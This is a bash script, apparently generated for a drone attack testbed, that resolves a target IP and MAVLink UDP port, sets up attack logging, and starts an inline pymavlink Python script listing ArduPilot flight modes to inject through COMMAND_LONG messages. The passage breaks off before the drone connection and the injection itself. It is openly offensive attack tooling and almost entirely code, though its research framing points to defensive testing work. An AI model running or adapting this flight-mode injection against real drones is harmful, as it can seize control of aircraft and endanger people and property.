#!/usr/bin/env bash
# Auto-generated from: Flight-Mode-Injection.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 기본 MAVLink UDP 포트
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=flight-mode-injection src=Flight-Mode-Injection.md"
log "[BLOCK 1] type=python (Inline Mode Injection Script)"

# MAVLink COMMAND_LONG을 이용한 Flight Mode Injection 스크립트 실행
python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
import time
from pymavlink import mavutil

# 지원되는 비행 모드 리스트 (ArduPilot 기준, 공격 대상 모드)
FLIGHT_MODES = [
    (1, "STABILIZE"),
    (2, "ACRO"),
    (4, "ALT_HOLD"),
    (10, "AUTO"),
    (15, "GUIDED"),
    (6, "LOITER"),
    (11, "RTL"),
    (9, "LAND")
]

# 인수가 누락되었을 경우 환경 변수 fallback
if len(sys.argv) <= 1:
    target_ip = os.environ.get("TARGET_IP", "127.0.0.1")
    target_port = os.environ.get("TARGET_PORT", "14550")
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

# 인수를 IP, Port로 파싱
try:
    target_ip, target_port_str = sys.argv[1].split(":", 1)
    target_port = int(target_port_str)
except Exception as e:
    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
    sys.exit(1)

# 드론에 연결